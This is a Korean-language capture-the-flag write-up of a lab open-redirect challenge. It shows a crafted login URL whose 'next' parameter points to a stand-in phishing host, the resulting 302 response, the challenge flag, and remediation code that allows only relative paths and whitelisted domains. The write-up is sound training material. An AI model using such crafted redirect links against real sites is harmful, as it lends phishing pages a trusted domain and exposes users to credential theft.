+++
title = "VulnABLE CTF [LUXORA] Write-up: Open Redirect 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Open Redirect", "Bronze", "Phishing", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Open Redirect 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Infrastructure Layer (Open Redirect)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/redirect/bronze`
- **목표**: 사용자가 로그인하거나 특정 작업을 완료한 후 원래 보던 페이지로 돌아가게 해주는 리다이렉트(Redirect) 기능에서, 입력값 검증이 누락된 점을 악용하여 사용자를 해커의 악성 사이트로 강제 이동(Open Redirect)시켜라.

---

## 🕵️‍♂️ 1. 정보 수집 및 동작 분석 (Reconnaissance)

`/redirect/bronze` 페이지는 로그인을 처리하는 가상의 엔드포인트입니다.
URL에 `next` 라는 파라미터가 붙어 있는 것을 볼 수 있습니다.

**[정상 로그인 시나리오]**
```http
GET /redirect/bronze/login?next=/dashboard HTTP/1.1
```
사용자가 로그인을 완료하면 서버는 `next` 파라미터의 값을 읽어서 그 주소로 사용자를 보냅니다.

**[서버의 정상 응답]**
```http
HTTP/1.1 302 Found
Location: /dashboard
```

**[해커의 사고 과정]**
1. 파라미터 이름이 `next`, `url`, `return_to`, `redirect` 등이면 높은 확률로 리다이렉트 취약점이 존재한다.
2. 서버가 `Location` 헤더에 이 값을 아무런 검증 없이 그대로 집어넣고 있다면?
3. 내가 저 `next` 파라미터에 내 악성 사이트 주소(`http://evil-attacker.com`)를 넣어서 피해자에게 링크를 주면, 피해자는 정상 사이트에서 로그인한 직후 내 사이트로 끌려올 것이다!

---

## 💥 2. 취약점 식별 및 악성 링크 생성 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Victim ] --(GET /login?next=//attacker.com)--> [ Web Server ]
                                                 |-- Redirects to Attacker Site
```


이 취약점은 그 자체로 서버를 해킹할 수는 없지만, **피싱(Phishing)** 공격에 매우 효과적으로 사용됩니다. (예: 정상 도메인으로 로그인하게 한 뒤, 똑같이 생긴 가짜 화면을 띄워 세션 쿠키를 탈취하거나 결제를 유도함)

### 💡 페이로드 작성
`next` 파라미터에 완전한 외부 URL(Absolute URL)을 입력해 봅니다.

**[조작된 URL]**
```text
http://localhost:3000/redirect/bronze/login?next=http://evil-attacker.com/phishing_page
```

---

## 🚀 3. 공격 수행 및 결과 확인

희생자(Admin Bot)가 위 링크를 클릭하여 접속합니다.

### 🔍 서버의 동작
서버는 로그인을 처리한 후, 어떠한 도메인 검증(Whitelisting)도 하지 않고 파라미터로 넘어온 외부 주소를 `Location` 헤더에 그대로 박아 넣습니다.

```http
HTTP/1.1 302 Found
Location: http://evil-attacker.com/phishing_page
```

희생자의 브라우저는 이 응답을 받고 즉시 해커의 피싱 사이트로 이동해 버립니다.
이와 동시에 챌린지 환경에서 리다이렉트 성공이 감지되어 플래그가 나타납니다.

```text
[!] System: Open Redirect executed successfully.
FLAG: FLAG{REDIRECT_🥉_BASIC_OPEN_REDIRECT_A1B2C3}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

사용자 입력을 기반으로 HTTP 302 리다이렉트를 수행할 때 목적지를 검증하지 않으면, 공식 도메인(`luxora.test`)의 신뢰도를 등에 업고 완벽한 피싱 공격을 수행할 수 있음을 증명했습니다.

**🔥 획득한 플래그:**
`FLAG{REDIRECT_🥉_BASIC_OPEN_REDIRECT_A1B2C3}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
리다이렉트할 주소를 클라이언트(파라미터)에게 전적으로 맡긴 것이 원인입니다.

* **안전한 패치 가이드 (상대 경로 강제 및 화이트리스트)**
1. **상대 경로(Relative Path) 강제**:
   외부 도메인으로 나가는 것을 막기 위해, 넘어온 값이 반드시 `/` 로 시작하는지 검사합니다.
   ```javascript
   const nextUrl = req.query.next;
   
   // 첫 글자가 슬래시(/)인지, 그리고 두 번째 글자는 슬래시가 아닌지(//example.com 방지) 검사
   if (nextUrl && nextUrl.startsWith('/') && !nextUrl.startsWith('//')) {
       res.redirect(nextUrl);
   } else {
       res.redirect('/default-dashboard');
   }
   ```
2. **도메인 화이트리스트(Whitelist)**:
   부득이하게 외부 도메인(예: SSO 연동 후 파트너사로 이동)으로 리다이렉트 해야 한다면, 반드시 서버에 하드코딩된 허용 리스트(Allowed Domains)와 일치하는지 검사해야 합니다.